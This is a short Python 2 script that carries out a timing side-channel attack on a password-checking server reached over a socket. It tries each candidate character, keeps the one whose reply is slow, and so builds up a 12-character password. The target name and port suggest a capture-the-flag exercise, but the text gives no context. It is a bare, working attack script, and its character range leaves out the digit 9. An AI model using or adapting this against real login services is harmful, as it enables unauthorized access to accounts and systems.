from socket import *
import sys
import time
 
HOST = 'server'
PORT = 1111

client = socket(AF_INET, SOCK_STREAM)
client.connect((HOST, PORT))

print client.recv(1024)

currPass = ""
while len(currPass) < 12:
    for i in range(ord("0"), ord("9")) + [ord("-")]:
        t = time.clock()
        print chr(i)
        client.send(currPass + chr(i))
        rep = client.recv(1024)
        t = time.clock()-t 
        if t>1:
            currPass += chr(i)
            print currPass
            break
    
client.send(currPass)
print(client.recv(1024))   

client.close()
